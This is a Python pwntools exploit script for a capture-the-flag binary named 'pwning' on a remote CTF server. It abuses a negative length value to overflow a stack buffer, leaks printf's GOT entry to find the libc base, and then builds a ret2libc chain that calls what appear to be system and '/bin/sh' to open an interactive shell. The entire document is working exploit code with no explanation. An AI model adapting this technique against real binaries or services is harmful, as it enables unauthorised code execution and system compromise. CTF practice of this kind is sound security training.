#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
#p = process("./pwning")
p = remote("ctf.j0n9hyun.xyz", 3019)
elf = ELF("./pwning")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
one_gadget_off = 0x3ac62
printf_plt = elf.plt['printf']
printf_got = elf.got['printf']
atoi_got = elf.got['atoi']
p1ret = 0x80484e1
vuln = elf.symbols['vuln']

p.sendlineafter("? ", str(-1))

pay = 'A'*(0x2c + 0x4)
pay += p32(printf_plt) + p32(p1ret) + p32(printf_got)
pay += p32(vuln)

p.sendlineafter("data!\n", pay)

p.recvuntil("\n")
printf = u32(p.recv(4))
log.info("printf : "+hex(printf))

libcBase = printf - 0x49020
#one_gadget = libcBase + one_gadget_off
log.info("libcBase : "+hex(libcBase))

p.sendlineafter("? ", str(-1))

#p.sendlineafter("data!\n", 'A'*(0x2c+0x4) + p32(one_gadget))
p.sendlineafter("data!\n", 'A'*(0x2c+0x4) + p32(libcBase + 0x03a940)+p32(p1ret) + p32(libcBase + 0x15902b))

p.interactive()

